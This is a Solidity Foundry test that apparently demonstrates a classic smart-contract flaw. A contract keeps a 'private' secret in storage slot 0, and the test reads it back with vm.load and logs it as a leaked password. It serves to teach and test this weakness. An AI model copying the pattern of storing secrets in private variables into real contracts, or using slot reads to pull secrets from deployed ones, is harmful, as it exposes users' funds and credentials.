// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.11;

import "forge-std/Test.sol";
//import "../../src/Vulns/Privdata.sol";

contract PrivdataTest is Test {
    Privdata public privdata;
    address public owner = vm.addr(1);
    function setUp() public {
        vm.prank(owner);
        privdata = new Privdata(22222222);
        vm.prank(owner);
        privdata.SetAdmin();
    }
    function testleak() public {
        bytes32 data = vm.load(address(privdata), bytes32(uint256(0)));
        console.log("Extracting the value of stored password in Slot 0....");
        emit log_uint(uint256(data)); 

    
}
}


contract Privdata {
uint256 private secret;
address public owner;

constructor(uint256 _secret){

    secret = _secret;
    owner = msg.sender;
}
mapping (address => uint256) Users;

    function SetAdmin() public {
        require(msg.sender == owner);
        Users[msg.sender] = secret;
    }

    function getUserSecret(address _user) public view returns (uint256) {
        return Users[_user];
    }
}


